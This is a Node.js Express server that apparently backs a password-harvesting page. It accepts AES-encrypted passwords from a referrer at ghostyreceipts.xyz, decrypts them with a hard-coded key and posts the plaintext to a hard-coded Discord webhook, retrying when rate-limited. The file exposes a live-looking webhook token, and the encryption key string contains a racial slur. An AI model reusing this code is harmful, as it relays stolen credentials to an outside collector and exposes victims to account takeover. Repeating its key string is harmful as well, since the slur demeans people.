import express from "express";
import fetch from "node-fetch";
import cors from "cors";
import bodyParser from "body-parser";
import CryptoJS from "crypto-js";
import rateLimit from "express-rate-limit";

const app = express();
const encryptionKey = "nigga.u.are.a.coon.u.aint.gon.find.a.vulnerability";

// Rate-limiting middleware
const limiter = rateLimit({
    windowMs: 5 * 60 * 1000, // 5 minutes
    max: 10, // Limit each IP to 10 requests per windowMs
    message: "Too many requests from this IP, please try again later",
    headers: true,
});

// In-memory store for passwords and timestamps
const passwordStore = new Map();

// Function to check if the password was used in the last 5 minutes
function isPasswordRecent(password) {
    const now = Date.now();
    const recentPassword = passwordStore.get(password);
    if (recentPassword && now - recentPassword < 5 * 60 * 1000) {
        return true;
    }
    return false;
}

// Delay function to wait for a certain number of milliseconds
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

app.use(cors());
app.use(bodyParser.json());

// Apply rate limiting to the /webhook route
app.post("/webhook", limiter, async (req, res) => {
    try {
        const referrer = req.get("Referrer");
        if (!referrer || !referrer.startsWith("https://ghostyreceipts.xyz")) {
            return res.status(403).send("Forbidden");
        }

        const encryptedMessage = req.body.password;

        const bytes = CryptoJS.AES.decrypt(encryptedMessage, encryptionKey);
        const decryptedMessage = bytes.toString(CryptoJS.enc.Utf8);

        // Check if the password is recent
        if (isPasswordRecent(decryptedMessage)) {
            return res.status(200).send("Password was recently used, not sending to webhook");
        }

        // Store the password and timestamp
        passwordStore.set(decryptedMessage, Date.now());

        const webhookData = { content: decryptedMessage };
        const webhookUrl = "https://discord.com/api/webhooks/1340602904138088530/emCGUboojJTRp46yy-Xa6VuiHCn_0Y6DRvdoFBO2XDsyCMmeN6-wQDVGxCqu4G9egy7I";

        // Try to send the webhook, handle rate limits
        let webhookResponse = await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(webhookData),
        });

        // If rate-limited (HTTP 429), wait and try again
        if (webhookResponse.status === 429) {
            const retryAfter = webhookResponse.headers.get('Retry-After') || 5; // Get 'Retry-After' header or fallback to 5 seconds
            console.log(`Rate limit hit. Retrying in ${retryAfter} seconds...`);
            await delay(retryAfter * 1000);  // Delay for the specified time
            webhookResponse = await fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(webhookData),
            });
        }

        if (!webhookResponse.ok) {
            console.error("Webhook failed:", await webhookResponse.text());
            return res.status(500).send("Failed to send data to webhook");
        }

        console.log("Password sent securely!");
        res.status(200).send("Data sent securely");
    } catch (error) {
        console.error("Error processing request:", error);
        res.status(500).send("Error processing request");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
